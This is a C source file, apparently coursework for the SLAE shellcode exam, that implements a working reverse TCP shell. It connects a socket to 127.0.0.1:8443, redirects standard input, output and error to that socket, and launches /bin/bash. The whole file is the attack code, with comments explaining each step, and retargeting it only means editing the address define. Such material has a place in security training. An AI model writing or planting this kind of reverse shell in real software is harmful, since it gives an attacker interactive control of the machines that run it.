// SLAE Exam Assignment #2: Shell Reverse TCP shellcode 
// Author: Rikih Gunawan

#include<stdio.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#define SHELL "/bin/bash"
#define REV_IP "127.0.0.1"
#define REV_PORT 8443

int main(int argc, char *argv[]) 
{
    int server_sock;
    struct sockaddr_in server_addr;

    /*
    Create a socket

    Address Family - AF_INET (this is IP version 4)
    Type - SOCK_STREAM (this means connection oriented TCP protocol)
    Protocol - 0 [ or IPPROTO_IP This is IP protocol]}
    */
    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Prepare the socketaddr_in structure
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, REV_IP, &server_addr.sin_addr);
    server_addr.sin_port = htons(REV_PORT);

    /* connect */
    connect(server_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));

    /* 
    Copy new_socket to FD
   
    0 STDIN_FILENO
    1 STDOUT_FILENO
    2 STDERR_FILENO
    */
    dup2(server_sock, 0); 
    dup2(server_sock, 1);
    dup2(server_sock, 2);

    // Execute shell
    execve(SHELL, NULL, NULL);

    return 0;

}